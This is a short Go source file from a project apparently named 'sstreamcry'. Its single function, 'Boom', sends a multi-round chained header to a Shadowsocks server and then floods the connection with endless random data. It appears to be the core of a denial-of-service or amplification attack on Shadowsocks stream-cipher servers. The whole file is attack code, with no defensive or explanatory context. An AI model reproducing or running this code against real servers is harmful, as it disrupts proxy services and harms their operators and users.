package shadowsocks

import (
	"crypto/rand"
	"io"

	"github.com/AkinoKaede/sstreamcry/common/internet"
	"github.com/AkinoKaede/sstreamcry/common/net"
)

func Boom(dest net.Destination, account Account, rounds int) error {
	data := EncodeHeaderChain(dest, account, rounds)
	conn, err := internet.Dial(dest)
	if err != nil {
		return err
	}
	defer conn.Close()

	if _, err := conn.Write(data); err != nil {
		return err
	}

	if _, err := io.Copy(conn, rand.Reader); err != nil {
		return err
	}

	return nil
}
